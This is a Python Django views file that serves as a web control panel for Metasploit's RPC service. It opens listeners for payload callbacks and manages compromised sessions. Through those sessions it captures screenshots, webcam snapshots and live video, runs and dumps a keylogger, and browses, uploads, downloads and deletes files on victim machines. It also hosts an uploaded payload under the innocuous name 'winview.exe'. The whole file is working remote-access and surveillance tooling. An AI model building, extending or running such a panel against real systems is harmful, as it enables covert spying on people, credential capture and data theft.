# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.http import HttpResponse, JsonResponse
import urllib
from django.shortcuts import render, redirect
from core.MsfToolbox import *
from datetime import datetime
from django.core.files.storage import FileSystemStorage
import anssi.settings

import time
from threading import Thread
from core.SessionTimedOutException import SessionTimedOutException


# Initialization of MSFTOOLBOX
toolbox = None

def handler():
	""" Thread handler """
	global toolbox
	while not toolbox:
		try:
			toolbox = MsfToolbox()
		except:
			toolbox = None
		time.sleep(1)

try:
	# msfrpc has been launched
	toolbox = MsfToolbox()
except:
	# Launch a thread to check if msfrpc has been launched
	t = Thread(target=handler)
	t.start()


# Views
def init_worker(request):
	lport = request.GET.get('lport', None)
	payload = request.GET.get('payload', None)
	toolbox.exploit_multi_handler(lport, payload)
	return JsonResponse({'init':True})


def init(request):
	# Check toolbox
	if not toolbox:
		return redirect(home)

	return render(request, 'server/init.html')


def jobs(request):
	# Check toolbox
	if not toolbox:
		return redirect(home)

	jobs = toolbox.get_jobs()
	return render(request, 'server/jobs.html', {'jobs': jobs, 'jobs_nbr': len(jobs)})


def jobs_kill(request, id):
	toolbox.kill_job(id)
	return redirect('jobs')


def home(request):
	flag = (toolbox != None)

	sessions = jobs = []
	_payload_exists = False
	if toolbox:
		sessions = toolbox.get_sessions()
		jobs = toolbox.get_jobs()
		_payload_exists = payload_exists()


	return render(request, 'server/home.html', {'flag': flag, 'sessions': sessions, 'sessions_nbr': len(sessions), 'jobs': jobs, 'jobs_nbr': len(jobs), 'payload_exists': _payload_exists})

def ready(request):
	value = (toolbox != None)
	
	return JsonResponse({'value': value}) 

def sessions(request):
	# Check toolbox
	if not toolbox:
		return redirect(home)

	sessions = toolbox.get_sessions()
	return render(request, 'server/sessions.html', {'sessions': sessions, 'sessions_nbr': len(sessions)})


def session(request, id):
	return redirect('session_information', id)


def session_information(request, id):
	try:
		sysinfo = toolbox.get_sysinfo(int(id))
	except SessionTimedOutException:
		return render(request, 'server/session_lost.html', {'id': int(id)})

	return render(request, 'server/session_information.html', {'id': int(id), 'infos': sysinfo })


def session_close(request, id):
	toolbox.session_close(int(id))
	return redirect('sessions')


def action_screenshot(request, id):
	toolbox.post_take_screenshot(session=int(id))
	return redirect(session_screenshot, id)


def session_screenshot(request, id):
	images = toolbox.get_screenshots_url(session=int(id))
	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images, 'len_images': len(images)})


def action_webcam(request, id):
	try:
		toolbox.post_take_snapshot(session=int(id))
	except SessionTimedOutException:
		return render(request, 'server/session_lost.html', {'id': int(id)})

	return redirect(session_webcam, id)


def session_webcam(request, id):
	has_webcam = toolbox.has_webcam(session=int(id))
	images = toolbox.get_snapshots_url(session=int(id))
	return render(request, 'server/session_webcam.html', {'id': int(id), 'has_webcam': has_webcam, 'images': images})


def session_live(request, id):
	has_webcam = toolbox.has_webcam(session=int(id))
	enabled = False
	live_url = toolbox.get_live_url()

	if request.GET.get('action') == 'start':
		toolbox.start_live(int(id))
		enabled = True
	elif request.GET.get('action') == 'stop':
		toolbox.stop_live(int(id))
		enabled = False
	elif request.GET.get('action') == 'update':
		toolbox.live_update_frame(int(id))

	return render(request, 'server/session_live.html', {'id': int(id), 'has_webcam': has_webcam, 'enabled': enabled, 'live_url': live_url})


def session_explorer(request, id):
	shell = toolbox.get_session_shell(int(id))

	path = request.GET.get('path')
	ftype = request.GET.get('type')
	delete = request.GET.get('delete', None)
	upload = request.FILES.get('file', None)

	try:
		uploaded = False
		if (upload != None):
			uploaded = toolbox.upload(shell, upload)

		if path != None and ftype == 'dir' and delete == None:
			toolbox.cd(shell, path)
			return redirect('session_explorer', id)
		elif path != None and ftype == 'dir':
			toolbox.rmdir(shell, path)
		elif path != None and ftype == 'fil' and delete == None:
			return toolbox.download(shell, path)
		elif path != None and delete:
			toolbox.rm(shell, path)

		(pwd, files, error) = toolbox.ls(shell)
	except SessionTimedOutException:
		return render(request, 'server/session_lost.html', {'id': int(id)})

	#toolbox.add_routing_files(files)
	return render(request, 'server/session_explorer.html', {'id': int(id), 'files': files, 'pwd': pwd, 'ls_error': error, 'have_uploaded': upload != None, 'have_uploaded_successfully': uploaded})


def payload_exists():
	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
	return os.path.exists(payload_file)


def upload_payload(request):
	payload_link = '/media/payload/winview.exe'
	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
	_payload_exists = payload_exists()

	uploaded = False

	if request.method == 'POST':
		uploaded_file = request.FILES.get('payload_binary', None)

		if uploaded_file:
			fs = FileSystemStorage()

			if _payload_exists:
				fs.delete(payload_file)

			fs.save('payload/winview.exe', uploaded_file)
			uploaded = True

	return render(request, 'server/payload.html', {'uploaded': uploaded, 'link': payload_link, 'exists': _payload_exists})


def session_keylogger(request, id):
	enabled = False

	try:
		if request.GET.get('action') == 'start':
			toolbox.start_keylogger(int(id))
			enabled = True
		elif request.GET.get('action') == 'stop':
			toolbox.stop_keylogger(int(id))
			enabled = False
		elif request.GET.get('action') == 'retrieve':
			value = toolbox.dump_keylogger(int(id))
			return JsonResponse({'value': value})
	except SessionTimedOutException:
		return render(request, 'server/session_lost.html', {'id': int(id)})

	return render(request, 'server/session_keylogger.html', {'id': int(id), 'enabled': enabled})


def remote(request):
	if request.GET.get('action') == 'enable':
		toolbox.enable_remote()
	elif request.GET.get('action') == 'disable':
		toolbox.disable_remote()
	elif request.GET.get('action') == 'state':
		return render(request, 'server/remote_state.html', {'enabled': toolbox.get_remote_state()})

	return render(request, 'server/remote.html', {'enabled': toolbox.get_remote_state()})


# Template filters
from django.template.defaulttags import register

@register.filter
def modulo(num, val):
    return num % val
